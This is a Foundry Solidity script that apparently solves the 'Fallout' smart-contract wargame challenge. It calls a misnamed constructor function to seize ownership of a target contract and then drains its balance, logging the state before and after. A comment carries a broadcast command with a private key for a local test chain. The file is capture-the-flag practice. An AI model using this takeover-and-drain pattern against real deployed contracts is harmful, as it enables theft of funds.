// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface IFallout {
    function Fal1out() external payable;
    function collectAllocations() external;
    function owner() external view returns (address);
}
contract SolveScript is Script {
    address public target = 0x5E3d0fdE6f793B3115A9E7f5EBC195bbeeD35d6C;

    function setUp() public {}

    // forge script -vvv script/Solve.s.sol --broadcast --tc SolveScript --legacy --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a --rpc-url http://localhost:8545
    function run() public {
        vm.startBroadcast();
        IFallout fo = IFallout(target);

        console.log("owner before poc : %s", fo.owner());
        console.log("target balance before poc : %d", target.balance);
        fo.Fal1out{value:100}();
        fo.collectAllocations();

        console.log("owner after poc : %s", fo.owner());
        console.log("target balance after poc : %d", target.balance);
        vm.stopBroadcast();
    }
}
